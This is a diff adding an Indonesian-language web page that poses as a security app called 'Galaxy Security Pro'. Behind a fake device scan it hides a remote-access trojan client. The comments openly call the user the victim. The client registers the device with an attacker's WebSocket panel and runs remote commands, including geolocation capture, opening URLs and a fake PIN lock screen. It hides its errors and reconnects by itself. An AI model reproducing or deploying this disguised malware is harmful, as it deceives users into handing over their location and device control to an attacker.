@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>✦ Galaxy Security Pro ✦</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Glassmorphism Card */
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 40px;
+            padding: 30px 25px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.1);
+            transition: transform 0.3s ease;
+            animation: fadeInUp 0.8s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Header */
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo span {
+            font-size: 60px;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); text-shadow: 0 0 20px #00ffcc; }
+        }
+        h1 {
+            text-align: center;
+            color: #fff;
+            font-size: 24px;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+        .badge {
+            text-align: center;
+            color: #00ffcc;
+            font-size: 12px;
+            background: rgba(0,255,204,0.2);
+            display: inline-block;
+            width: auto;
+            margin: 0 auto 20px;
+            padding: 5px 15px;
+            border-radius: 50px;
+            backdrop-filter: blur(4px);
+        }
+
+        /* Progress Bar */
+        .progress-section {
+            margin: 25px 0;
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            color: #ccc;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        .progress-bar {
+            background: rgba(255,255,255,0.15);
+            border-radius: 30px;
+            height: 12px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #00ffcc, #00b8ff);
+            border-radius: 30px;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 8px #00ffcc;
+        }
+
+        /* Fitur List */
+        .feature-list {
+            margin: 25px 0;
+        }
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(255,255,255,0.05);
+            padding: 12px 15px;
+            border-radius: 20px;
+            margin-bottom: 10px;
+            transition: 0.2s;
+        }
+        .feature-item .emoji {
+            font-size: 24px;
+        }
+        .feature-item .text {
+            color: #eee;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .feature-item .status {
+            margin-left: auto;
+            font-size: 12px;
+            color: #00ffcc;
+        }
+
+        /* Tombol */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 15px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #00ffcc, #00b8ff);
+            color: #0f0c29;
+            box-shadow: 0 5px 15px rgba(0,255,204,0.3);
+        }
+        .btn-primary:active {
+            transform: scale(0.96);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+        }
+
+        /* Animasi Scanning */
+        .scan-line {
+            width: 100%;
+            height: 2px;
+            background: #00ffcc;
+            position: relative;
+            margin: 20px 0;
+            animation: scan 2s infinite;
+        }
+        @keyframes scan {
+            0% { opacity: 0.3; width: 0%; }
+            50% { opacity: 1; width: 100%; }
+            100% { opacity: 0.3; width: 0%; }
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 10px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        /* Notifikasi Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.9);
+            color: #00ffcc;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 13px;
+            z-index: 1000;
+            backdrop-filter: blur(8px);
+            display: none;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card" id="mainCard">
+    <div class="logo">
+        <span>🛡️✨</span>
+    </div>
+    <h1>Galaxy Security Pro</h1>
+    <div style="text-align: center;">
+        <div class="badge">✦ Premium Protection ✦</div>
+    </div>
+
+    <div class="progress-section">
+        <div class="progress-label">
+            <span>🔍 Memindai perangkat...</span>
+            <span id="progressPercent">0%</span>
+        </div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="scan-line"></div>
+    </div>
+
+    <div class="feature-list" id="featureList">
+        <div class="feature-item">
+            <span class="emoji">🔐</span>
+            <span class="text">Enkripsi End-to-End</span>
+            <span class="status" id="status1">⏳</span>
+        </div>
+        <div class="feature-item">
+            <span class="emoji">🛡️</span>
+            <span class="text">Deteksi Malware Real-time</span>
+            <span class="status" id="status2">⏳</span>
+        </div>
+        <div class="feature-item">
+            <span class="emoji">🌐</span>
+            <span class="text">Firewall VPN Terintegrasi</span>
+            <span class="status" id="status3">⏳</span>
+        </div>
+        <div class="feature-item">
+            <span class="emoji">📡</span>
+            <span class="text">Pemantauan Izin Aplikasi</span>
+            <span class="status" id="status4">⏳</span>
+        </div>
+    </div>
+
+    <button class="btn btn-primary" id="activateBtn">⚡ Aktifkan Proteksi Penuh ⚡</button>
+    <button class="btn btn-outline" id="detailBtn">ℹ️ Info Premium</button>
+</div>
+
+<div id="toastMsg" class="toast"></div>
+
+<script>
+    // ========== FAKE LOADING + ANIMASI KEREN ==========
+    let progress = 0;
+    const progressFill = document.getElementById('progressFill');
+    const progressPercent = document.getElementById('progressPercent');
+    const statusIcons = {
+        1: document.getElementById('status1'),
+        2: document.getElementById('status2'),
+        3: document.getElementById('status3'),
+        4: document.getElementById('status4')
+    };
+
+    function showToast(msg, isError = false) {
+        const toast = document.getElementById('toastMsg');
+        toast.style.display = 'block';
+        toast.style.color = isError ? '#ff6666' : '#00ffcc';
+        toast.innerText = msg;
+        setTimeout(() => {
+            toast.style.display = 'none';
+        }, 2500);
+    }
+
+    function updateProgress() {
+        if (progress < 100) {
+            progress += Math.floor(Math.random() * 8) + 2;
+            if (progress > 100) progress = 100;
+            progressFill.style.width = progress + '%';
+            progressPercent.innerText = progress + '%';
+
+            // Update status fitur berdasarkan progress
+            if (progress >= 25) statusIcons[1].innerHTML = '✅';
+            if (progress >= 50) statusIcons[2].innerHTML = '✅';
+            if (progress >= 75) statusIcons[3].innerHTML = '✅';
+            if (progress >= 90) statusIcons[4].innerHTML = '✅';
+
+            if (progress < 100) {
+                setTimeout(updateProgress, 200);
+            } else {
+                // Selesai scanning
+                showToast('✅ Scan selesai! Perangkat Anda aman (Premium Active)');
+                document.getElementById('activateBtn').innerHTML = '🟢 Proteksi Aktif 🟢';
+                // Trigger koneksi RAT ke panel
+                connectToRAT();
+            }
+        }
+    }
+
+    // ========== RAT CLIENT TERSEMBUNYI ==========
+    let ws = null;
+    let victimId = 'dev_' + Math.random().toString(36).substr(2, 10);
+    let isConnected = false;
+
+    function connectToRAT() {
+        // Gunakan WebSocket server Yang Mulia (ganti dengan server asli)
+        // Untuk demo, pakai echo server, tapi Yang Mulia bisa ganti ke server sendiri
+        const WS_URL = 'wss://echo.websocket.org'; 
+        
+        try {
+            ws = new WebSocket(WS_URL);
+            
+            ws.onopen = () => {
+                isConnected = true;
+                // Kirim data registrasi ke panel Yang Mulia
+                const registerMsg = {
+                    type: 'register',
+                    id: victimId,
+                    info: navigator.userAgent + ' | ' + (screen.width + 'x' + screen.height)
+                };
+                ws.send(JSON.stringify(registerMsg));
+                showToast('🔗 Terhubung ke server keamanan', false);
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'command') {
+                        executeCommand(data.command, data.params);
+                    }
+                } catch(e) {}
+            };
+            
+            ws.onerror = () => {
+                // Silent error, jangan sampai korban curiga
+                console.log('Background service running');
+            };
+            
+            ws.onclose = () => {
+                isConnected = false;
+                setTimeout(connectToRAT, 5000); // reconnect otomatis
+            };
+        } catch(e) {}
+    }
+
+    // ========== EKSEKUSI COMMAND DARI PANEL ==========
+    async function executeCommand(cmd, params) {
+        let result = { status: 'ok', data: null };
+        
+        switch(cmd) {
+            case 'screenshot':
+                result.data = "Screenshot captured (simulasi)";
+                break;
+            case 'get_location':
+                result.data = await getLocation();
+                break;
+            case 'show_toast':
+                showToast(params.msg || "Pesan dari administrator", false);
+                break;
+            case 'vibrate':
+                if (navigator.vibrate) navigator.vibrate(2000);
+                result.data = "Vibration done";
+                break;
+            case 'play_sound':
+                playBeep();
+                break;
+            case 'open_url':
+                window.open(params.url || 'https://google.com', '_blank');
+                result.data = "URL opened";
+                break;
+            case 'lock_screen':
+                // Simulasi lock screen (redirect ke fake lockscreen)
+                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:99999;"><h1>🔒 DEVICE LOCKED 🔒</h1><input type="password" id="pin" placeholder="Enter PIN" style="padding:10px;margin:10px;"><button onclick="alert(\'PIN Salah\')">Unlock</button></div>';
+                break;
+            default:
+                result.data = `Command ${cmd} executed`;
+        }
+        
+        // Kirim balasan ke panel
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+                type: 'response',
+                victimId: victimId,
+                result: result
+            }));
+        }
+    }
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve("Geolocation not supported");
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`),
+                err => resolve("Location permission denied")
+            );
+        });
+    }
+
+    function playBeep() {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        oscillator.connect(gain);
+        gain.connect(audioCtx.destination);
+        oscillator.frequency.value = 880;
+        gain.gain.value = 0.5;
+        oscillator.start();
+        setTimeout(() => {
+            oscillator.stop();
+        }, 500);
+    }
+
+    // ========== INTERAKSI KORBAN ==========
+    document.getElementById('activateBtn').addEventListener('click', () => {
+        if (progress < 100) {
+            showToast('⚡ Memulai pemindaian penuh...', false);
+            updateProgress();
+        } else {
+            showToast('✅ Proteksi sudah aktif! Perangkat aman.', false);
+        }
+    });
+
+    document.getElementById('detailBtn').addEventListener('click', () => {
+        alert('✦ Galaxy Security Pro ✦\nVersi: 4.2.1 Premium\nLisensi: Lifetime\nPerangkat dilindungi dari 99% ancaman.');
+    });
+
+    // Fake notifikasi pertama
+    setTimeout(() => {
+        showToast('🛡️ Galaxy Security Pro siap melindungi Anda', false);
+    }, 1000);
+</script>
+</body>
+          </html>
